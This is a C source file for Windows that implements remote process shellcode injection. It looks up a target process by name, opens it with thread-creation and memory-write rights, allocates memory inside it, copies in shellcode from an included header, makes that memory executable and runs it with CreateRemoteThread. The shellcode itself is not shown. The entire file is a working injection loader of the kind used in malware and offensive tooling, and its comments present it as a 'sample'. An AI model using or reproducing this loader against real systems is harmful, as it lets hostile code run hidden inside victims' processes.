#include <Windows.h>
#include <TlHelp32.h>
#include <stdio.h>
#include "shellcode.h"

#define MAX_PROCESS_NAME 260

// Returns the PID of the first process matching procName, or 0 if not found.
// Multiple instances of the same image are out of scope for this sample.
static DWORD FindProcessId(const WCHAR* procName) {
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnap == INVALID_HANDLE_VALUE) {
		wprintf(L"CreateToolhelp32Snapshot failed. Error: %lu\n", GetLastError());
		return 0;
	}

	PROCESSENTRY32W pe;
	pe.dwSize = sizeof(pe);

	DWORD pid = 0;
	if (Process32FirstW(hSnap, &pe)) {
		do {
			if (_wcsicmp(procName, pe.szExeFile) == 0) {
				pid = pe.th32ProcessID;
				break;
			}
		} while (Process32NextW(hSnap, &pe));
	}
	CloseHandle(hSnap);
	return pid;
}

int main(void) {
	WCHAR procName[MAX_PROCESS_NAME];
	SIZE_T codeSize = sizeof(shellcode);
	HANDLE hProc = NULL;
	LPVOID pMem = NULL;
	HANDLE hThread = NULL;
	int rc = 1;

	wprintf(L"Enter process name: ");
	if (!fgetws(procName, _countof(procName), stdin)) return 1;
	procName[wcscspn(procName, L"\r\n")] = L'\0';

	DWORD pid = FindProcessId(procName);
	if (pid == 0) {
		wprintf(L"Process not found.\n");
		return 1;
	}

	wprintf(L"[+] Found %ls(PID %lu)\n", procName, pid);

	hProc = OpenProcess(
		PROCESS_CREATE_THREAD |		// CreateRemoteThread
		PROCESS_VM_OPERATION |		// VirtualAllocEx, VirtualProtectEx
		PROCESS_VM_WRITE,			// WriteProcessMemory
		FALSE, pid);
	if (hProc == NULL) {
		wprintf(L"OpenProcess failed. Error: %lu\n", GetLastError());
		goto cleanup;
	}

	pMem = VirtualAllocEx(hProc, NULL, codeSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (pMem == NULL) {
		wprintf(L"VirtualAllocEx failed. Error: %lu\n", GetLastError());
		goto cleanup;
	}
	wprintf(L"[+] Allocated %zu bytes at %p\n", codeSize, pMem);

	if (!WriteProcessMemory(hProc, pMem, shellcode, codeSize, NULL)) {
		wprintf(L"WriteProcessMemory failed. Error: %lu\n", GetLastError());
		goto cleanup;
	}
	wprintf(L"[+] Wrote the shellcode into the target\n");

	DWORD oldProtect;
	if (!VirtualProtectEx(hProc, pMem, codeSize, PAGE_EXECUTE_READ, &oldProtect)) {
		wprintf(L"VirtualProtectEx failed. Error: %lu\n", GetLastError());
		goto cleanup;
	}
	wprintf(L"[+] Changed the memory protection to PAGE_EXECUTE_READ\n");

	FlushInstructionCache(hProc, pMem, codeSize);

	hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pMem, NULL, 0, NULL);
	if (hThread == NULL) {
		wprintf(L"CreateRemoteThread failed. Error: %lu\n", GetLastError());
		goto cleanup;
	}
	wprintf(L"[+] Remote thread created\n");

	WaitForSingleObject(hThread, INFINITE);

	DWORD exitCode = 0;
	if (!GetExitCodeThread(hThread, &exitCode)) {
		wprintf(L"GetExitCodeThread failed. Error: %lu\n", GetLastError());
		goto cleanup;
	}
	if (exitCode == 0) {
		wprintf(L"Shellcode failed to resolve its APIs.\n");
		goto cleanup;
	}
	wprintf(L"[+] Shellcode executed successfully\n");
	rc = 0;

cleanup:
	if (hThread)	CloseHandle(hThread);
	if (pMem)		VirtualFreeEx(hProc, pMem, 0, MEM_RELEASE);
	if (hProc)		CloseHandle(hProc);
	return rc;
}